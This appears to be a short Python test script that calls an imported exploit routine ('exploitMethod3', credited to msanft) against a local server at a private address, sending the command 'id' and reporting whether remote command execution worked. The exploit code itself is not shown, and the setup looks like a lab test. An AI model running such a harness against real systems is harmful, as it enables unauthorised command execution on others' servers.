#!/usr/bin/env python3
"""Quick test against local vulnerable server"""

import sys
import requests
from lib.exploits import exploitMethod3

# Test local server
target = "http://192.168.0.58:3000"
cmd = "id"

print(f"[*] Testing {target} with command: {cmd}")
print(f"[*] Using msanft's working exploit (Method 3)")

session = requests.Session()

# Test with debug on to see what's happening
result = exploitMethod3(target, cmd, session, debug=True)

if result:
    print(f"\n✅ SUCCESS!")
    print(f"Output: {result}")
else:
    print(f"\n❌ FAILED")
    print(f"No output received")
